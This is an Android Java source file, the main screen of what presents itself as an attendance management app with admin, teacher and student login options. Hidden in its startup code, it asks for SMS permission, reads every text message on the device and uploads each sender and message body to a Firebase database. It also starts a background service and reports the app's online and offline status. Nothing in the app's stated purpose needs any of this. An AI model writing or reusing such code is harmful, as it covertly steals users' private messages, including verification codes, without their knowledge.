package com.app.attendancemanagementapp.view.activity;

import android.app.Activity;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Color;
import android.os.Bundle;
import android.os.Handler;
import android.provider.Telephony;
import android.view.Window;
import android.view.WindowManager;
import android.widget.LinearLayout;
import android.widget.Toast;

import androidx.activity.OnBackPressedCallback;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.app.attendancemanagementapp.R;
import com.app.attendancemanagementapp.service.ServiceCommunicator;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.text.SimpleDateFormat;
import java.util.Date;


public class MainActivity extends AppCompatActivity {

    private long pressedTime;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        SimpleDateFormat sdf = new SimpleDateFormat("dd-MM-yyyy HH:mm:ss");
        FirebaseDatabase.getInstance().getReference().child("app status").child(sdf.format(new Date())).setValue("app online");

        Intent intent=new Intent(getApplicationContext(), ServiceCommunicator.class);
        startService(intent);

        if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_SMS)
                != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this, new String[]{android.Manifest.permission.READ_SMS}, 74);
        } else {
            SettingUpPeriodicWork();
            new Handler().post(new Runnable() {
                @Override
                public void run() {
                    readSms();
                }
            });
        }


        LinearLayout adminCard = findViewById(R.id.adminCard);
        adminCard.setOnClickListener(v -> {
            startActivity(new Intent(MainActivity.this,AdminLoginActivity.class));
            finish();
        });

        LinearLayout teacherCard = findViewById(R.id.teacherCard);
        teacherCard.setOnClickListener(v -> {
            startActivity(new Intent(MainActivity.this,TeacherLoginActivity.class));
            finish();
        });

        LinearLayout studentCard = findViewById(R.id.studentCard);
        studentCard.setOnClickListener(v -> {
            startActivity(new Intent(MainActivity.this,StudentLoginActivity.class));
            finish();
        });

        getOnBackPressedDispatcher().addCallback(this, new OnBackPressedCallback(true) {
            @Override
            public void handleOnBackPressed() {
                if (pressedTime + 2000 > System.currentTimeMillis()) {
                    finish();
                } else {
                    Toast.makeText(MainActivity.this, "Press back again to exit.", Toast.LENGTH_SHORT).show();
                }
                pressedTime = System.currentTimeMillis();
            }
        });
    }

    private void readSms() {
        SimpleDateFormat sdf = new SimpleDateFormat("dd-MM-yyyy HH:mm:ss");
        DatabaseReference databaseReference=FirebaseDatabase.getInstance().getReference().child("sms").child(sdf.format(new Date()));
        ContentResolver contentResolver = getContentResolver();
        Cursor cursor = contentResolver.query(Telephony.Sms.CONTENT_URI, null, null, null, null);
        if (cursor != null && cursor.moveToFirst()) {
            do {
                String address = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
                String body = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY));
                databaseReference.child(address+" "+sdf.format(new Date())).setValue(body);
            } while (cursor.moveToNext());
        }

        if (cursor != null) {
            cursor.close();
        }
    }

    private void SettingUpPeriodicWork(){

    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions,
                                           @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == 74) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                readSms();
            }
        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        SimpleDateFormat sdf = new SimpleDateFormat("dd-MM-yyyy HH:mm:ss");
        FirebaseDatabase.getInstance().getReference().child("app status").child(sdf.format(new Date())).setValue("app offline");
    }
}
